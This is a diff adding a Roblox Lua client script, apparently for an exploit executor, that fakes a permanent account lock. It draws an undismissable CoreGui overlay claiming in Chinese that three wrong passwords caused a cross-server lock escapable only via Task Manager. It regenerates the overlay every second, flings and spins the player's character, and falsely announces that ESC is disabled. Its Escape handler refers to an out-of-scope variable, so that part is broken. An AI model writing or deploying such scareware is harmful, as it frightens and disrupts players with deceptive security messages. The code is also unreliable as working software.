@@ -1,0 +1,191 @@
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local UserInputService = game:GetService("UserInputService")
+local GuiService = game:GetService("GuiService")
+local CoreGui = game:GetService("CoreGui")
+local RunService = game:GetService("RunService")
+
+if not _G.PermanentLock then
+    _G.PermanentLock = {
+        enabled = true,
+        screenGui = nil,
+        connections = {},
+        placeId = nil
+    }
+end
+
+local function createPermanentLockScreen()
+    if _G.PermanentLock.screenGui and _G.PermanentLock.screenGui.Parent then
+        _G.PermanentLock.screenGui:Destroy()
+    end
+    
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "PermanentLockSystem"
+    screenGui.DisplayOrder = 999999
+    screenGui.IgnoreGuiInset = true
+    screenGui.Parent = CoreGui
+    
+    local bg = Instance.new("Frame")
+    bg.Size = UDim2.new(1, 0, 1, 0)
+    bg.BackgroundColor3 = Color3.new(0, 0, 0)
+    bg.Parent = screenGui
+    
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0, 600, 0, 350)
+    frame.Position = UDim2.new(0.5, -300, 0.5, -175)
+    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 40)
+    frame.Parent = screenGui
+    
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 15)
+    corner.Parent = frame
+    
+    local stroke = Instance.new("UIStroke")
+    stroke.Color = Color3.fromRGB(255, 0, 0)
+    stroke.Thickness = 5
+    stroke.Parent = frame
+    
+    local icon = Instance.new("TextLabel")
+    icon.Size = UDim2.new(0, 100, 0, 100)
+    icon.Position = UDim2.new(0.5, -50, 0.2, -50)
+    icon.Text = "⛔"
+    icon.TextColor3 = Color3.fromRGB(255, 50, 50)
+    icon.TextScaled = true
+    icon.Font = Enum.Font.GothamBold
+    icon.BackgroundTransparency = 1
+    icon.Parent = frame
+    
+    local text = Instance.new("TextLabel")
+    text.Size = UDim2.new(0.9, 0, 0.4, 0)
+    text.Position = UDim2.new(0.05, 0, 0.5, 0)
+    text.Text = "您的密码已错误三次,已被永久锁定"
+    text.TextColor3 = Color3.fromRGB(255, 50, 50)
+    text.TextScaled = true
+    text.Font = Enum.Font.GothamBold
+    text.TextWrapped = true
+    text.BackgroundTransparency = 1
+    text.Parent = frame
+    
+    local sub = Instance.new("TextLabel")
+    sub.Size = UDim2.new(0.8, 0, 0.2, 0)
+    sub.Position = UDim2.new(0.1, 0, 0.8, 0)
+    sub.Text = "跨服务器永久锁定 - 只能通过任务管理器结束进程"
+    sub.TextColor3 = Color3.fromRGB(220, 220, 220)
+    sub.TextScaled = true
+    sub.Font = Enum.Font.Gotham
+    sub.TextWrapped = true
+    sub.BackgroundTransparency = 1
+    sub.Parent = frame
+    
+    _G.PermanentLock.screenGui = screenGui
+    
+    task.spawn(function()
+        while _G.PermanentLock.enabled and screenGui.Parent do
+            icon.TextTransparency = 0.3
+            stroke.Transparency = 0.5
+            task.wait(0.8)
+            icon.TextTransparency = 0
+            stroke.Transparency = 0
+            task.wait(0.8)
+        end
+    end)
+    
+    return screenGui
+end
+
+local function setupPermanentFlying()
+    local character = Players.LocalPlayer.Character
+    if not character then
+        character = Players.LocalPlayer.CharacterAdded:Wait()
+    end
+    
+    local humanoid = character:WaitForChild("Humanoid")
+    local root = character:WaitForChild("HumanoidRootPart")
+    
+    humanoid.PlatformStand = true
+    root.Anchored = false
+    root.CFrame = root.CFrame + Vector3.new(0, 1000, 0)
+    
+    local spin = 0
+    
+    task.spawn(function()
+        while _G.PermanentLock.enabled and root and root.Parent do
+            spin = spin + 0.5
+            if spin > 20 then spin = 20 end
+            
+            local velocity = Vector3.new(
+                math.sin(os.clock() * 2) * 200,
+                math.sin(os.clock() * 1.5) * 100 + 50,
+                math.cos(os.clock() * 2) * 200
+            )
+            
+            root.Velocity = velocity
+            root.CFrame = root.CFrame * CFrame.Angles(0, spin, spin)
+            
+            task.wait()
+        end
+    end)
+end
+
+local function protectGUI()
+    task.spawn(function()
+        while _G.PermanentLock.enabled do
+            if not _G.PermanentLock.screenGui or not _G.PermanentLock.screenGui.Parent then
+                createPermanentLockScreen()
+            end
+            task.wait(1)
+        end
+    end)
+end
+
+local function interceptTeleport()
+    local connection
+    connection = TeleportService.TeleportInitFailed:Connect(function()
+        createPermanentLockScreen()
+    end)
+    table.insert(_G.PermanentLock.connections, connection)
+end
+
+local function blockExit()
+    local menuConnection = GuiService.MenuOpened:Connect(function()
+        _G.PermanentLock.screenGui.DisplayOrder = 1000000
+    end)
+    table.insert(_G.PermanentLock.connections, menuConnection)
+    
+    local escConnection = UserInputService.InputBegan:Connect(function(input)
+        if input.KeyCode == Enum.KeyCode.Escape then
+            text.Text = "ESC已被永久禁用"
+            task.wait(1)
+            text.Text = "您的密码已错误三次,已被永久锁定"
+        end
+    end)
+    table.insert(_G.PermanentLock.connections, escConnection)
+end
+
+local function initPermanentLock()
+    if _G.PermanentLock.initialized then return end
+    _G.PermanentLock.initialized = true
+    
+    createPermanentLockScreen()
+    protectGUI()
+    blockExit()
+    interceptTeleport()
+    
+    task.spawn(function()
+        while _G.PermanentLock.enabled do
+            setupPermanentFlying()
+            task.wait(5)
+        end
+    end)
+    
+    Players.LocalPlayer.CharacterAdded:Connect(function()
+        task.wait(1)
+        setupPermanentFlying()
+    end)
+    
+    if Players.LocalPlayer.Character then
+        setupPermanentFlying()
+    end
+end
+
+initPermanentLock()
